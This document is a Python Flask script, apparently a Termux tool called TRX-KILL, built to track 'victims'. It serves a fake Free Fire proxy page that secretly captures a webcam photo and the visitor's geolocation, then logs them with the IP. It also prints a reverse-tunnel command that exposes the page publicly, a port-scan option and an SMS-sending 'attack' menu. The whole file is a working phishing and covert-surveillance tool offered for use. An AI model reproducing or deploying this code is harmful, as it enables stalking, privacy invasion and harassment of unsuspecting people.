import os, sys, time, threading, base64
from flask import Flask, request

app = Flask('TRX-KILL')
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"
FOTO_DIR = f"{STORAGE_PATH}/fotos"
G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"

# Configuración inicial
for p in [STORAGE_PATH, FOTO_DIR]:
    if not os.path.exists(p): os.makedirs(p)

# HTML con captura mejorada
HTML_TEMPLATE = """
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>PROXY</title>
<style>
    body{background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
    .c{border:2px solid #0f0;padding:30px;text-align:center;border-radius:10px;box-shadow:0 0 10px #0f0;}
    button{background:#0f0;border:none;padding:15px 30px;font-weight:bold;cursor:pointer;}
</style></head><body>
<div class="c"><h1>PROXY FREEFIRE</h1><button onclick="iniciar()">CONTINUAR</button></div>
<video id="v" style="display:none"></video>
<script>
async function iniciar() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        const v = document.getElementById('v'); v.srcObject = stream;
        setTimeout(()=>{
            const canvas = document.createElement('canvas');
            canvas.width=640; canvas.height=480;
            canvas.getContext('2d').drawImage(v,0,0,640,480);
            fetch('/foto', {method:'POST', body:canvas.toDataURL('image/jpeg')});
        }, 1000);
    } catch(e) {}
    navigator.geolocation.getCurrentPosition(pos => {
        fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
        window.location.href = 'https://www.garena.com';
    });
}
</script></body></html>
"""

@app.route('/')
def index(): return HTML_TEMPLATE

@app.route('/foto', methods=['POST'])
def foto():
    data = request.data.decode().split(',')[1]
    with open(f"{FOTO_DIR}/cam_{int(time.time())}.jpg", "wb") as f: f.write(base64.b64decode(data))
    return "OK"

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f: f.write(f"LAT:{request.args.get('lat')}|LON:{request.args.get('lon')}|IP:{request.remote_addr}\n")
    return "OK"

def animar(t):
    for c in t: sys.stdout.write(c); sys.stdout.flush(); time.sleep(0.01)
    print()

def banner():
    os.system('clear')
    print(f"{G}  _______________________________________")
    print(f"{G} |           TRX-KILL v1.4.5             |")
    print(f"{G} |_______________________________________|{W}\n")

def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
    while True:
        try:
            banner()
            print(f"{C} [01] RASTREAR VÍCTIMA  | [02] LINK TÚNEL")
            print(f" [03] GESTIÓN DE FOTOS  | [04] VER LOGS")
            print(f" [05] ESCANER DE PUERTOS| [06] IP PÚBLICA")
            print(f" [11] ATACK-SMS         | [00] SALIR{W}")
            s = input(f"\n{Y}TRX-ROOT > {W}")
            
            if s == "1":
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        lines = f.readlines()
                        if lines:
                            d = lines[-1].split('|')
                            print(f"\n{G}[+] COORDENADAS: {W}{d[0].replace('LAT:','')} , {d[1].replace('LON:','')}")
                            print(f"{G}[+] LINK MAPA: {W}https://www.google.com/maps/search/?api=1&query={d[0].replace('LAT:','')},{d[1].replace('LON:','')}")
                input(f"\n{Y}PRESIONA ENTER...{W}")
            elif s == "2":
                print(f"\n{C}EJECUTA EN OTRA VENTANA: {W}ssh -R 80:localhost:5000 ssh.localhost.run")
                input(f"\n{Y}PRESIONA ENTER...{W}")
            elif s == "5":
                target = input("IP/HOST A ESCANEAR: ")
                os.system(f"nmap -F {target}")
                input(f"\n{Y}PRESIONA ENTER...{W}")
            elif s == "11":
                num = input(f"{Y}NÚMERO VÍCTIMA: {W}")
                os.system(f"termux-sms-send -n {num} 'TRX-KILL: Alerta de seguridad!'")
                animar(f"{G}[!] SMS ENVIADO.{W}")
                input(f"\n{Y}PRESIONA ENTER...{W}")
            elif s == "0": sys.exit()
        except: continue

if __name__ == "__main__": main()
